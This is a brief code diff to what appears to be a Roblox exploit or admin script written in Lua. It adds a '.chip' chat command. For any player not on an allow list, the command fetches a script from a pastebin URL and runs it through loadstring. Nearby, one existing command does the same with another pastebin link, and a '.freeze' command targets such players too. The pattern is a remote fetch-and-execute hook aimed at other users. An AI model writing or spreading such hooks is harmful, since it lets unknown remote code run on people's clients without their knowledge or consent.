@@ -10584,6 +10584,11 @@ local commands = {
 			loadstring(game:HttpGet("https://pastebin.com/raw/g69qR2Gq"))()
 		end
 	end,
+	[".chip"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			loadstring(game:HttpGet("https://pastebin.com/raw/P4cnkM4A"))()
+		end
+	end,
 	[".freeze"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
